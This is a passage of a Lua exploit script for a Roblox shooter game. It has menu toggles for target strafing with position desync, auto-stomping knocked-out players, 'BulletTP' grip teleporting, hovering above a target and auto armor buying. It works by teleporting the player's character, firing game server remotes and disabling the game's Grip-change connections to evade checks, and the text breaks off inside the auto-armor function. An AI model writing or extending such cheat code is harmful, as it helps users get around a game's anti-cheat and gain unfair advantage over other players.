	if (target and target.Character and target.Character:FindFirstChild("Humanoid")) then
		local hum = target.Character.Humanoid;
		local hp = hum.Health;
		if (lastTarget ~= target) then
			lastTarget = target;
			lastHP = hp;
		else
			if (hp < lastHP) then
				local previousHP = lastHP;
				G.processHitEffects(target, previousHP);
			end
			lastHP = hp;
		end
	else
		lastTarget, lastHP = nil, nil;
	end
end);
G.findRootPart = function(character)
	return character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso") or character:FindFirstChild("LowerTorso");
end;
local TargetStrafeGroup = Tabs.Combat:AddLeftGroupbox(">_<");
local TS = {Config={Enabled=false,Radius=10,Height=5,Speed=2,Visualise=false,VisualiseColor=Color3.fromRGB(255, 255, 255),UseDesync=false},Runtime={Angle=0,Connection=nil,Target=nil,FollowPart=nil,DesyncPosition=nil,VisualiseDrawing=nil,LastAimbotTarget=nil,LastUpdateTime=0}};
getgenv().TS = TS;
TS.createFollowPart = function()
	if (TS.Runtime.FollowPart and TS.Runtime.FollowPart.Parent) then
		TS.Runtime.FollowPart:Destroy();
	end
	local part = Instance.new("Part");
	part.Name = "TargetStrafeFollowPart";
	part.Anchored = true;
	part.CanCollide = false;
	part.Transparency = 1;
	part.Size = Vector3.new(0.1, 0.1, 0.1);
	part.Parent = game:GetService("Workspace");
	if (LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")) then
		part.CFrame = LP.Character.HumanoidRootPart.CFrame + Vector3.new(0, 2, 0);
	end
	return part;
end;
TS.resetCamera = function()
	if (TS.Runtime.FollowPart and TS.Runtime.FollowPart.Parent) then
		TS.Runtime.FollowPart:Destroy();
		TS.Runtime.FollowPart = nil;
	end
	if (LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")) then
		game:GetService("Workspace").CurrentCamera.CameraSubject = LP.Character:FindFirstChildOfClass("Humanoid");
	end
end;
TS.updateVisual = function()
	if (not TS.Config.Visualise or not TS.Runtime.DesyncPosition) then
		if TS.Runtime.VisualiseDrawing then
			TS.Runtime.VisualiseDrawing.Visible = false;
		end
		return;
	end
	local currentTime = tick();
	if ((currentTime - TS.Runtime.LastUpdateTime) < 0.016) then
		return;
	end
	TS.Runtime.LastUpdateTime = currentTime;
	if not TS.Runtime.VisualiseDrawing then
		TS.Runtime.VisualiseDrawing = Drawing.new("Line");
		TS.Runtime.VisualiseDrawing.Thickness = 2;
		TS.Runtime.VisualiseDrawing.ZIndex = 10000;
	end
	local screenPos, onScreen = game:GetService("Workspace").CurrentCamera:WorldToViewportPoint(TS.Runtime.DesyncPosition);
	if onScreen then
		TS.Runtime.VisualiseDrawing.From = game:GetService("UserInputService"):GetMouseLocation();
		TS.Runtime.VisualiseDrawing.To = Vector2.new(screenPos.X, screenPos.Y);
		TS.Runtime.VisualiseDrawing.Color = TS.Config.VisualiseColor;
		TS.Runtime.VisualiseDrawing.Visible = true;
	else
		TS.Runtime.VisualiseDrawing.Visible = false;
	end
end;
TS.cleanupVisual = function()
	if TS.Runtime.VisualiseDrawing then
		TS.Runtime.VisualiseDrawing:Remove();
		TS.Runtime.VisualiseDrawing = nil;
	end
end;
local function performTargetStrafeDesync()
	if (not TS.Config.Enabled or not TS.Config.UseDesync) then
		TS.Runtime.DesyncPosition = nil;
		if (TS.Runtime.VisualiseDrawing and TS.Runtime.VisualiseDrawing.Visible) then
			TS.Runtime.VisualiseDrawing.Visible = false;
		end
		return;
	end
	local target = getgenv().SilentAim and getgenv().SilentAim.currentTarget;
	if (not target or not target.Character) then
		TS.Runtime.DesyncPosition = nil;
		return;
	end
	local targetHRP = target.Character:FindFirstChild("HumanoidRootPart");
	if not targetHRP then
		TS.Runtime.DesyncPosition = nil;
		return;
	end
	local character = LP.Character;
	if not character then
		TS.Runtime.DesyncPosition = nil;
		return;
	end
	local hrp = character:FindFirstChild("HumanoidRootPart");
	if not hrp then
		TS.Runtime.DesyncPosition = nil;
		return;
	end
	TS.Runtime.Angle = TS.Runtime.Angle + (TS.Config.Speed * HRT:Wait());
	local offset = Vector3.new(math.cos(TS.Runtime.Angle) * TS.Config.Radius, TS.Config.Height, math.sin(TS.Runtime.Angle) * TS.Config.Radius);
	local originalCFrame = hrp.CFrame;
	local targetPos = targetHRP.Position;
	local newPos = targetPos + offset;
	local newCFrame = CFrame.new(newPos, targetPos);
	TS.Runtime.DesyncPosition = newPos;
	if TS.Config.Visualise then
		TS.updateVisual();
	end
	if (TS.Config.Enabled and TS.Config.UseDesync) then
		if (TS.Runtime.FollowPart and TS.Runtime.FollowPart.Parent) then
			TS.Runtime.FollowPart.CFrame = originalCFrame + Vector3.new(0, 2, 0);
		else
			TS.Runtime.FollowPart = TS.createFollowPart();
			TS.Runtime.FollowPart.CFrame = originalCFrame + Vector3.new(0, 2, 0);
		end
		game:GetService("Workspace").CurrentCamera.CameraSubject = TS.Runtime.FollowPart;
	end
	hrp.CFrame = newCFrame;
	task.spawn(function()
		game:GetService("RunService").RenderStepped:Wait();
		if (hrp and hrp.Parent) then
			hrp.CFrame = originalCFrame;
		end
	end);
	task.spawn(function()
		game:GetService("RunService").RenderStepped:Wait();
		if (character and character:FindFirstChildOfClass("Humanoid")) then
			game:GetService("Workspace").CurrentCamera.CameraSubject = character:FindFirstChildOfClass("Humanoid");
		end
	end);
end
local function performTargetStrafe()
	if not TS.Config.Enabled then
		return;
	end
	if TS.Config.UseDesync then
		return;
	end
	local target = getgenv().SilentAim and getgenv().SilentAim.currentTarget;
	if (not target or not target.Character) then
		return;
	end
	local targetHRP = target.Character:FindFirstChild("HumanoidRootPart");
	if not targetHRP then
		return;
	end
	local character = LP.Character;
	if not character then
		return;
	end
	local hrp = character:FindFirstChild("HumanoidRootPart");
	if not hrp then
		return;
	end
	TS.Runtime.Angle = TS.Runtime.Angle + (TS.Config.Speed * HRT:Wait());
	local offset = Vector3.new(math.cos(TS.Runtime.Angle) * TS.Config.Radius, TS.Config.Height, math.sin(TS.Runtime.Angle) * TS.Config.Radius);
	local targetPos = targetHRP.Position;
	local newPos = targetPos + offset;
	hrp.CFrame = CFrame.new(hrp.Position:Lerp(newPos, 0.1), targetPos);
end
local function toggleTargetStrafe(state)
	TS.Config.Enabled = state;
	if TS.Runtime.Connection then
		TS.Runtime.Connection:Disconnect();
		TS.Runtime.Connection = nil;
	end
	if not state then
		TS.Runtime.DesyncPosition = nil;
		TS.cleanupVisual();
		TS.resetCamera();
	end
	if state then
		if TS.Config.UseDesync then
			TS.Runtime.FollowPart = TS.createFollowPart();
		end
		if TS.Config.UseDesync then
			TS.Runtime.Connection = HRT:Connect(performTargetStrafeDesync);
		else
			TS.Runtime.Connection = HRT:Connect(performTargetStrafe);
		end
		Library:Notify(">_< on", 3);
	else
		TS.resetCamera();
		Library:Notify(">_< off", 3);
	end
end
addToggleWithNotify(TargetStrafeGroup, "TargetStrafeEnabled", {Text="TargetStrafe",Default=false,Callback=function(v)
	toggleTargetStrafe(v);
end,Tooltip=">_<"});
addToggleWithNotify(TargetStrafeGroup, "TargetStrafeDesync", {Text="UseDesync",Default=false,Callback=function(v)
	TS.Config.UseDesync = v;
	if TS.Config.Enabled then
		toggleTargetStrafe(false);
		toggleTargetStrafe(true);
	end
end,Tooltip=">_<"});
TargetStrafeGroup:AddSlider("TargetStrafeRadius", {Text="Radius",Default=TS.Config.Radius,Min=1,Max=20,Rounding=1,Callback=function(v)
	TS.Config.Radius = v;
end});
TargetStrafeGroup:AddSlider("TargetStrafeHeight", {Text="Height",Default=TS.Config.Height,Min=-50,Max=50,Rounding=1,Callback=function(val)
	TS.Config.Height = val;
end});
TargetStrafeGroup:AddSlider("TargetStrafeSpeed", {Text="Speed",Default=TS.Config.Speed,Min=0.5,Max=30,Rounding=1,Callback=function(val)
	TS.Config.Speed = val;
end});
addToggleWithNotify(TargetStrafeGroup, "TargetStrafeVisualise", {Text="Visualise",Default=false,Callback=function(v)
	TS.Config.Visualise = v;
	if not v then
		TS.cleanupVisual();
	end
end,Tooltip=">_<"}):AddColorPicker("TargetStrafeVisualiseColor", {Default=TS.Config.VisualiseColor,Title="Color",Transparency=0,Callback=function(val)
	TS.Config.VisualiseColor = val;
end});
LP.CharacterAdded:Connect(function(newCharacter)
	if TS.Config.Enabled then
		task.wait(0.5);
		if (TS.Runtime.FollowPart and TS.Config.UseDesync) then
			TS.resetCamera();
			TS.Runtime.FollowPart = TS.createFollowPart();
		end
	end
end);
local aimbotTargetWatcher = nil;
aimbotTargetWatcher = HRT:Connect(function()
	if (TS.Config.Enabled and TS.Config.UseDesync and TS.Config.Visualise and TS.Runtime.DesyncPosition) then
		TS.updateVisual();
	elseif (TS.Runtime.VisualiseDrawing and TS.Runtime.VisualiseDrawing.Visible) then
		TS.Runtime.VisualiseDrawing.Visible = false;
	end
end);
local CameraGroup = Tabs.Player:AddRightGroupbox(">_<");
addToggleWithNotify(CameraGroup, "UnlockCameraDistance", {Text="Unlock Camera",Default=false,Callback=function(v)
	if v then
		game.Players.LocalPlayer.CameraMaxZoomDistance = math.huge;
	else
		game.Players.LocalPlayer.CameraMaxZoomDistance = 128;
	end
end,Tooltip=">_<"});
local AutoStompGroup = Tabs.Combat:AddRightGroupbox(">_<");
getgenv().AutoStomp = {Enabled=false,StompCount=100,StompInterval=0.099,YOffset=2,isActive=false,stompCounter=0,lastStompTime=nil,followPart=nil};
addToggleWithNotify(AutoStompGroup, "AutoStompEnabled", {Text="AutoStomp",Default=false,Callback=function(v)
	getgenv().AutoStomp.Enabled = v;
	if (not v and getgenv().AutoStomp.isActive) then
		getgenv().AutoStomp.isActive = false;
		getgenv().AutoStomp.stompCounter = 0;
		getgenv().AutoStomp.lastStompTime = nil;
		resetAutoStompCamera();
	end
end,Tooltip=">_<"});
AutoStompGroup:AddSlider("AutoStompInterval", {Text="Stomp Interval",Default=getgenv().AutoStomp.StompInterval,Min=0.01,Max=1,Rounding=3,Callback=function(v)
	getgenv().AutoStomp.StompInterval = v;
end,Tooltip=">_<"});
local function isPlayerKO(player)
	if (not player or not player.Character) then
		return false;
	end
	local bodyEffects = player.Character:FindFirstChild("BodyEffects");
	if not bodyEffects then
		return false;
	end
	local ko = bodyEffects:FindFirstChild("K.O");
	local grabbed = bodyEffects:FindFirstChild("Grabbed");
	return ko and ko.Value and (not grabbed or not grabbed.Value);
end
local function getRagdollPart(character)
	if not character then
		return nil;
	end
	for _, partName in ipairs({"UpperTorso","LowerTorso"}) do
		local part = character:FindFirstChild(partName);
		if part then
			return part;
		end
	end
	return nil;
end
local function createAutoStompFollowPart()
	if (getgenv().AutoStomp.followPart and getgenv().AutoStomp.followPart.Parent) then
		getgenv().AutoStomp.followPart:Destroy();
	end
	local part = Instance.new("Part");
	part.Name = "AutoStompFollowPart";
	part.Anchored = true;
	part.CanCollide = false;
	part.Transparency = 1;
	part.Size = V3.new(0.1, 0.1, 0.1);
	part.Parent = S.WS;
	return part;
end
local function resetAutoStompCamera()
	if (getgenv().AutoStomp.followPart and getgenv().AutoStomp.followPart.Parent) then
		getgenv().AutoStomp.followPart:Destroy();
		getgenv().AutoStomp.followPart = nil;
	end
	local isTargetStrafeActive = getgenv().TS and getgenv().TS.Config and getgenv().TS.Config.Enabled;
	if not isTargetStrafeActive then
		if (LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")) then
			S.WS.CurrentCamera.CameraSubject = LP.Character:FindFirstChildOfClass("Humanoid");
		end
	end
end
local function performStomp()
	local mainEvent = game:GetService("ReplicatedStorage"):FindFirstChild("MainEvent");
	if mainEvent then
		mainEvent:FireServer("Stomp");
	end
	local assets = game:GetService("ReplicatedStorage"):FindFirstChild("assets");
	if (assets and assets:FindFirstChild("dh")) then
		if (assets.dh and assets.dh.MainEvent) then
			assets.dh.MainEvent:FireServer("Stomp");
		end
	end
	getgenv().AutoStomp.stompCounter = getgenv().AutoStomp.stompCounter - 1;
	getgenv().AutoStomp.lastStompTime = tick();
	if (getgenv().AutoStomp.stompCounter <= 0) then
		getgenv().AutoStomp.isActive = false;
		resetAutoStompCamera();
	end
end
G.applyAutoStomp = function()
	if not getgenv().AutoStomp.Enabled then
		if getgenv().AutoStomp.isActive then
			getgenv().AutoStomp.isActive = false;
			getgenv().AutoStomp.stompCounter = 0;
			getgenv().AutoStomp.lastStompTime = nil;
			resetAutoStompCamera();
		end
		return;
	end
	local targetPlayer = getgenv().SilentAim and getgenv().SilentAim.currentTarget;
	if (not targetPlayer or not targetPlayer.Character) then
		return;
	end
	if not isPlayerKO(targetPlayer) then
		if getgenv().AutoStomp.isActive then
			getgenv().AutoStomp.isActive = false;
			resetAutoStompCamera();
		end
		return;
	end
	local ragdollPart = getRagdollPart(targetPlayer.Character);
	if not ragdollPart then
		return;
	end
	local isAutoArmorBuying = G.AutoArmorSettings and G.AutoArmorSettings.IsBuying;
	if not getgenv().AutoStomp.isActive then
		getgenv().AutoStomp.isActive = true;
		getgenv().AutoStomp.stompCounter = getgenv().AutoStomp.StompCount;
		getgenv().AutoStomp.lastStompTime = tick();
		getgenv().AutoStomp.followPart = createAutoStompFollowPart();
	end
	if isAutoArmorBuying then
		return;
	end
	if getgenv().AutoStomp.isActive then
		local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart");
		if not hrp then
			return;
		end
		local originalCFrame = hrp.CFrame;
		local targetPosition = ragdollPart.Position;
		local isTargetStrafeActive = getgenv().TS and getgenv().TS.Config and getgenv().TS.Config.Enabled;
		if (getgenv().AutoStomp.followPart and not isTargetStrafeActive) then
			getgenv().AutoStomp.followPart.CFrame = originalCFrame + V3.new(0, 2, 0);
			Cam.CameraSubject = getgenv().AutoStomp.followPart;
		end
		hrp.CFrame = CFrame.new(targetPosition + Vector3.new(0, getgenv().AutoStomp.YOffset, 0));
		S.RS.RenderStepped:Wait();
		hrp.CFrame = originalCFrame;
		task.spawn(function()
			S.RS.RenderStepped:Wait();
			local isTargetStrafeActive = getgenv().TS and getgenv().TS.Config and getgenv().TS.Config.Enabled;
			if not isTargetStrafeActive then
				if (LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")) then
					Cam.CameraSubject = LP.Character:FindFirstChildOfClass("Humanoid");
				end
			end
		end);
		if (getgenv().AutoStomp.lastStompTime and ((tick() - getgenv().AutoStomp.lastStompTime) >= getgenv().AutoStomp.StompInterval) and (getgenv().AutoStomp.stompCounter > 0)) then
			performStomp();
		end
	end
end;
HRT:Connect(function()
	if getgenv().AutoStomp.Enabled then
		G.applyAutoStomp();
	end
end);
local GripGroup = Tabs.Combat:AddRightGroupbox(">_<");
addToggleWithNotify(GripGroup, "GripEnabled", {Text="CustomGrip",Default=false,Callback=function(v)
	G.GripSettings.Enabled = v;
end,Tooltip=">_<"});
GripGroup:AddLabel("Position:");
GripGroup:AddSlider("GripPosX", {Text="X",Default=0,Min=-100,Max=100,Rounding=1,Callback=function(val)
	G.GripSettings.Position = Vector3.new(val, G.GripSettings.Position.Y, G.GripSettings.Position.Z);
end});
GripGroup:AddSlider("GripPosY", {Text="Y",Default=0,Min=-100,Max=100,Rounding=1,Callback=function(val)
	G.GripSettings.Position = Vector3.new(G.GripSettings.Position.X, val, G.GripSettings.Position.Z);
end});
GripGroup:AddSlider("GripPosZ", {Text="Z",Default=0,Min=-100,Max=100,Rounding=1,Callback=function(val)
	G.GripSettings.Position = Vector3.new(G.GripSettings.Position.X, G.GripSettings.Position.Y, val);
end});
GripGroup:AddLabel("Rotation:");
GripGroup:AddSlider("GripRotX", {Text="X",Default=0,Min=-180,Max=180,Rounding=1,Callback=function(val)
	G.GripSettings.Rotation = Vector3.new(val, G.GripSettings.Rotation.Y, G.GripSettings.Rotation.Z);
end});
GripGroup:AddSlider("GripRotY", {Text="Y",Default=0,Min=-180,Max=180,Rounding=1,Callback=function(val)
	G.GripSettings.Rotation = Vector3.new(G.GripSettings.Rotation.X, val, G.GripSettings.Rotation.Z);
end});
GripGroup:AddSlider("GripRotZ", {Text="Z",Default=0,Min=-180,Max=180,Rounding=1,Callback=function(val)
	G.GripSettings.Rotation = Vector3.new(G.GripSettings.Rotation.X, G.GripSettings.Rotation.Y, val);
end});
GripGroup:AddLabel("Options:");
GripGroup:AddButton({Text="Reset",Func=function()
	G.GripSettings.Position = Vector3.new(0, 0, 0);
	G.GripSettings.Rotation = Vector3.new(0, 0, 0);
	Options.GripPosX:SetValue(0);
	Options.GripPosY:SetValue(0);
	Options.GripPosZ:SetValue(0);
	Options.GripRotX:SetValue(0);
	Options.GripRotY:SetValue(0);
	Options.GripRotZ:SetValue(0);
end,Tooltip=">_<"});
local gripConnection;
if gripConnection then
	gripConnection:Disconnect();
end
gripConnection = S.RS.Stepped:Connect(function()
	if G.GripSettings.Enabled then
		local character = LP.Character;
		local tool = character and character:FindFirstChildOfClass("Tool");
		if tool then
			local position = G.GripSettings.Position;
			local angles = CFrame.Angles(M.rad(G.GripSettings.Rotation.X), M.rad(G.GripSettings.Rotation.Y), M.rad(G.GripSettings.Rotation.Z));
			tool.Grip = CFrame.new(position) * angles;
		end
	end
end);
local BulletTpGroup = Tabs.Combat:AddLeftGroupbox(">_<");
getgenv().BulletTp = {Enabled=false,Toggle=true,Keybind=Enum.KeyCode.C,Part="Head",Selected=nil,UseAimbotTarget=true};
addToggleWithNotify(BulletTpGroup, "BulletTpToggle", {Text="BulletTP",Default=false,Callback=function(v)
	getgenv().BulletTp.Toggle = v;
end,Tooltip=">_<"});
BulletTpGroup:AddLabel("BulletTP Key"):AddKeyPicker("BulletTpKey", {Default="None",Text="Key",NoUI=false,Callback=function()
	if (getgenv().BulletTp and getgenv().BulletTp.Toggle) then
		local wasEnabled = getgenv().BulletTp.Enabled;
		getgenv().BulletTp.Enabled = not wasEnabled;
		Library:Notify(">_< " .. ((getgenv().BulletTp.Enabled and "on") or "off"), 2);
	end
end});
BulletTpGroup:AddDropdown("BulletTpPart", {Text="Part",Values={"Head","HumanoidRootPart","Torso","UpperTorso","LowerTorso","Left Arm","Right Arm","Left Leg","Right Leg","LeftUpperArm","RightUpperArm","LeftUpperLeg","RightUpperLeg"},Default="Head",Callback=function(v)
	getgenv().BulletTp.Part = v;
end,Tooltip=">_<"});
G.findBodyPart = function(character, partName)
	if not character then
		return nil;
	end
	local part = character:FindFirstChild(partName);
	if (part and part:IsA("BasePart")) then
		return part;
	end
	local partMap = {Torso={"UpperTorso","LowerTorso"},UpperTorso={"Torso"},LowerTorso={"Torso"},["Left Arm"]={"LeftUpperArm","LeftLowerArm","LeftHand"},["Right Arm"]={"RightUpperArm","RightLowerArm","RightHand"},["Left Leg"]={"LeftUpperLeg","LeftLowerLeg","LeftFoot"},["Right Leg"]={"RightUpperLeg","RightLowerLeg","RightFoot"},LeftUpperArm={"Left Arm"},RightUpperArm={"Right Arm"},LeftUpperLeg={"Left Leg"},RightUpperLeg={"Right Leg"}};
	if partMap[partName] then
		for _, altName in ipairs(partMap[partName]) do
			part = character:FindFirstChild(altName);
			if (part and part:IsA("BasePart")) then
				return part;
			end
		end
	end
	return character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("Head");
end;
G.TeleportBullet = function(tool)
	local success, err = pcall(function()
		local BTP = getgenv().BulletTp;
		if (not BTP.Toggle or not BTP.Enabled) then
			return;
		end
		local target = (getgenv().SilentAim and getgenv().SilentAim.currentTarget) or BTP.Selected;
		if (not target or not target.Character) then
			return;
		end
		local originPart = LP.Character and LP.Character:FindFirstChild("RightHand");
		if not originPart then
			originPart = LP.Character and LP.Character:FindFirstChild("Right Arm");
		end
		if not originPart then
			return;
		end
		local targetPart = G.findBodyPart(target.Character, BTP.Part);
		if not targetPart then
			return;
		end
		if (originPart and targetPart) then
			local grip = tool.Grip;
			tool.Parent = LP.Backpack;
			tool.Grip = G.bulletTpCFOffset(originPart.CFrame, targetPart.CFrame);
			tool.Parent = LP.Character;
			S.RS.RenderStepped:Wait();
			tool.Parent = LP.Backpack;
			tool.Grip = grip;
			tool.Parent = LP.Character;
		end
	end);
	if (not success and err) then
	end
end;
G.HandleCharacter = function(character)
	local success, err = pcall(function()
		for k, conn in pairs(G.bulletTpConns) do
			if ((k ~= "InputBegan") and (k ~= "CharacterAdded") and (k ~= "CharacterRemoving") and (k ~= "TargetUpdate")) then
				if (typeof(conn) == "RBXScriptConnection") then
					conn:Disconnect();
				end
				G.bulletTpConns[k] = nil;
			end
		end
		G.bulletTpConns.CharacterChildAdded = character.ChildAdded:Connect(function(tool)
			if tool:IsA("Tool") then
				for _, conn in ipairs(getconnections(tool:GetPropertyChangedSignal("Grip"))) do
					conn:Disable();
				end
				if G.bulletTpConns.ToolActivated then
					G.bulletTpConns.ToolActivated:Disconnect();
				end
				G.bulletTpConns.ToolActivated = tool.Activated:Connect(function()
					G.TeleportBullet(tool);
				end);
			end
		end);
		G.bulletTpConns.ChildRemovingCharacter = character.ChildRemoved:Connect(function(child)
			if (child:IsA("Tool") and G.bulletTpConns.ToolActivated) then
				G.bulletTpConns.ToolActivated:Disconnect();
				G.bulletTpConns.ToolActivated = nil;
			end
		end);
		local existingTool = character:FindFirstChildOfClass("Tool");
		if existingTool then
			for _, conn in ipairs(getconnections(existingTool:GetPropertyChangedSignal("Grip"))) do
				conn:Disable();
			end
			if G.bulletTpConns.ToolActivated then
				G.bulletTpConns.ToolActivated:Disconnect();
			end
			G.bulletTpConns.ToolActivated = existingTool.Activated:Connect(function()
				G.TeleportBullet(existingTool);
			end);
		end
	end);
	if (not success and err) then
	end
end;
G.getClosestPlayer = function()
	local success, result = pcall(function()
		local closest, dist = nil, math.huge;
		local myPos = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") and LP.Character.HumanoidRootPart.Position;
		if not myPos then
			return nil;
		end
		for _, p in ipairs(S.PS:GetPlayers()) do
			if ((p ~= LP) and p.Character and p.Character:FindFirstChild("HumanoidRootPart") and p.Character:FindFirstChildOfClass("Humanoid") and (p.Character:FindFirstChildOfClass("Humanoid").Health > 0)) then
				local d = (p.Character.HumanoidRootPart.Position - myPos).Magnitude;
				if (d < dist) then
					closest, dist = p, d;
				end
			end
		end
		return closest;
	end);
	if success then
		return result;
	else
		return nil;
	end
end;
G.SetupBulletTp = function()
	local success, err = pcall(function()
		for k, conn in pairs(G.bulletTpConns) do
			if (typeof(conn) == "RBXScriptConnection") then
				conn:Disconnect();
			end
		end
		G.bulletTpConns = {};
		if LP.Character then
			G.HandleCharacter(LP.Character);
		end
		G.bulletTpConns.CharacterAdded = LP.CharacterAdded:Connect(function(newCharacter)
			task.wait(0.5);
			G.HandleCharacter(newCharacter);
		end);
		G.bulletTpConns.CharacterRemoving = LP.CharacterRemoving:Connect(function()
			for k, conn in pairs(G.bulletTpConns) do
				if ((k ~= "InputBegan") and (k ~= "CharacterAdded") and (k ~= "CharacterRemoving") and (k ~= "TargetUpdate")) then
					if (typeof(conn) == "RBXScriptConnection") then
						conn:Disconnect();
					end
					G.bulletTpConns[k] = nil;
				end
			end
		end);
		if not G.bulletTpConns.TargetUpdate then
			G.bulletTpConns.TargetUpdate = HRT:Connect(function()
				if (not getgenv().SilentAim or not getgenv().SilentAim.currentTarget) then
					getgenv().BulletTp.Selected = G.getClosestPlayer();
				end
			end);
		end
	end);
	if (not success and err) then
		task.delay(5, G.SetupBulletTp);
	end
end;
task.spawn(function()
	pcall(G.SetupBulletTp);
end);
S.PS.PlayerRemoving:Connect(function(player)
	if (player == LP) then
		pcall(function()
			for k, conn in pairs(G.bulletTpConns) do
				if (typeof(conn) == "RBXScriptConnection") then
					conn:Disconnect();
				end
			end
			G.bulletTpConns = {};
		end);
	end
end);
local SaveDistanceGroup = Tabs.Combat:AddRightGroupbox(">_<");
getgenv().SaveDistance = {Enabled=false,OffsetX=0,OffsetY=100,OffsetZ=0,Connection=nil,IsBuyingArmor=false,LastTarget=nil,DampingConnection=nil};
SaveDistanceGroup:AddToggle("SaveDistanceEnabled", {Text="SavePos",Default=false,Callback=function(v)
	getgenv().SaveDistance.Enabled = v;
	toggleSaveDistance(v);
end,Tooltip=">_<"});
SaveDistanceGroup:AddSlider("SaveDistanceOffsetX", {Text="X",Default=0,Min=-200,Max=200,Rounding=0,Increment=1,Callback=function(v)
	getgenv().SaveDistance.OffsetX = v;
end,Tooltip=">_<"});
SaveDistanceGroup:AddSlider("SaveDistanceOffsetY", {Text="Y",Default=100,Min=-200,Max=200,Rounding=0,Increment=1,Callback=function(v)
	getgenv().SaveDistance.OffsetY = v;
end,Tooltip=">_<"});
SaveDistanceGroup:AddSlider("SaveDistanceOffsetZ", {Text="Z",Default=0,Min=-200,Max=200,Rounding=0,Increment=1,Callback=function(v)
	getgenv().SaveDistance.OffsetZ = v;
end,Tooltip=">_<"});
G.resolveCFrame = function(player)
	if (not player or not player.Character) then
		return nil;
	end
	local success, result = pcall(function()
		local character = player.Character;
		local humanoid = character:FindFirstChildOfClass("Humanoid");
		local hrp = character:FindFirstChild("HumanoidRootPart");
		if (not humanoid or not hrp) then
			return nil;
		end
		local velocity = hrp.Velocity;
		local moveDirection = humanoid.MoveDirection;
		local lookVector = hrp.CFrame.LookVector;
		local isMoving = velocity.Magnitude > 0.1;
		local isPredictable = moveDirection.Magnitude > 0.1;
		if (isMoving and isPredictable) then
			local velocityUnit = velocity.Unit;
			local dot = velocityUnit:Dot(lookVector);
			if (math.abs(dot) > 0.7) then
				local forward = moveDirection.Unit;
				local right = Vector3.new(forward.z, 0, -forward.x).Unit;
				local up = Vector3.new(0, 1, 0);
				return CFrame.fromMatrix(hrp.Position, right, up, forward);
			end
		end
		return hrp.CFrame;
	end);
	if (success and result) then
		return result;
	else
		return player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character.HumanoidRootPart.CFrame;
	end
end;
function smoothDamping(hrp, duration)
	if getgenv().SaveDistance.DampingConnection then
		getgenv().SaveDistance.DampingConnection:Disconnect();
		getgenv().SaveDistance.DampingConnection = nil;
	end
	if not hrp then
		return;
	end
	local initialVelocity = hrp.Velocity;
	local startTime = tick();
	getgenv().SaveDistance.DampingConnection = game:GetService("RunService").Heartbeat:Connect(function()
		local elapsedTime = tick() - startTime;
		local progress = math.min(elapsedTime / duration, 1);
		if (progress >= 1) then
			hrp.Velocity = Vector3.new(0, -1, 0);
			if getgenv().SaveDistance.DampingConnection then
				getgenv().SaveDistance.DampingConnection:Disconnect();
				getgenv().SaveDistance.DampingConnection = nil;
			end
			return;
		end
		local dampFactor = math.exp(-10 * progress);
		hrp.Velocity = initialVelocity * dampFactor;
	end);
end
function toggleSaveDistance(state)
	if getgenv().SaveDistance.Connection then
		getgenv().SaveDistance.Connection:Disconnect();
		getgenv().SaveDistance.Connection = nil;
		if (not state and LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")) then
			smoothDamping(LP.Character.HumanoidRootPart, 0.8);
		end
	end
	if (state and getgenv().SaveDistance.DampingConnection) then
		getgenv().SaveDistance.DampingConnection:Disconnect();
		getgenv().SaveDistance.DampingConnection = nil;
	end
	if state then
		getgenv().SaveDistance.Connection = HRT:Connect(function()
			if getgenv().SaveDistance.IsBuyingArmor then
				return;
			end
			local target = getgenv().SilentAim and getgenv().SilentAim.currentTarget;
			if ((target ~= getgenv().SaveDistance.LastTarget) and getgenv().SaveDistance.LastTarget) then
				if (LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")) then
					smoothDamping(LP.Character.HumanoidRootPart, 0.3);
				end
			end
			getgenv().SaveDistance.LastTarget = target;
			if (not target or not target.Character) then
				return;
			end
			local resolvedTargetCF = G.resolveCFrame(target);
			if not resolvedTargetCF then
				return;
			end
			local character = LP.Character;
			if not character then
				return;
			end
			local hrp = character:FindFirstChild("HumanoidRootPart");
			if not hrp then
				return;
			end
			local targetPos = resolvedTargetCF.Position;
			local offset = Vector3.new(getgenv().SaveDistance.OffsetX, getgenv().SaveDistance.OffsetY, getgenv().SaveDistance.OffsetZ);
			local offsetInWorldSpace = (resolvedTargetCF.RightVector * offset.X) + Vector3.new(0, offset.Y, 0) + (resolvedTargetCF.LookVector * offset.Z);
			local newPos = targetPos + offsetInWorldSpace;
			hrp.CFrame = CFrame.new(newPos, targetPos);
		end);
		Library:Notify(">_< on", 3);
	else
		Library:Notify(">_< off", 3);
	end
end
G.AutoArmorGroup = Tabs.Misc:AddLeftGroupbox("AutoArmor");
G.AutoArmorSettings = {Enabled=false,LastArmorCheck=0,CheckInterval=1,MinArmorValue=50,ArmorType=1,Notify=true,DebugMode=false,BuyingArmor=nil,IsBuying=false,BuyingTimeout=0,Connection=nil,char=nil,armorValue=0,hrp=nil,armorShop=nil,armorItem=nil,originalCFrame=nil,originalVelocity=nil,autoStompOriginalState=nil,originalTSState=nil,DesyncPosition=nil};
G.getCurrentArmorValue = function()
	G.char = LP.Character;
	if (G.char and G.char:FindFirstChild("BodyEffects") and G.char.BodyEffects:FindFirstChild("Armor")) then
		return G.char.BodyEffects.Armor.Value;
	end
	if (LP:FindFirstChild("DataFolder") and LP.DataFolder:FindFirstChild("Information") and LP.DataFolder.Information:FindFirstChild("Armor")) then
		return tonumber(LP.DataFolder.Information.Armor.Value) or 0;
	end
	G.possiblePaths = {{LP.Character,"Armor"},{LP,"Armor"},{LP,"stats","Armor"},{LP,"Data","Armor"},{LP,"PlayerData","Armor"}};
	for _, path in ipairs(G.possiblePaths) do
		G.current = path[1];
		G.found = true;
		for i = 2, #path do
			if (G.current and G.current:FindFirstChild(path[i])) then
				G.current = G.current[path[i]];
			else
				G.found = false;
				break;
			end
		end
		if (G.found and G.current and ((typeof(G.current) == "number") or ((typeof(G.current) == "Instance") and G.current:IsA("NumberValue")) or G.current:IsA("IntValue"))) then
			return ((typeof(G.current) == "number") and G.current) or G.current.Value;
		end
	end
	return 0;
end;
G.autoArmorFunction = function()
	G.success = pcall(function()
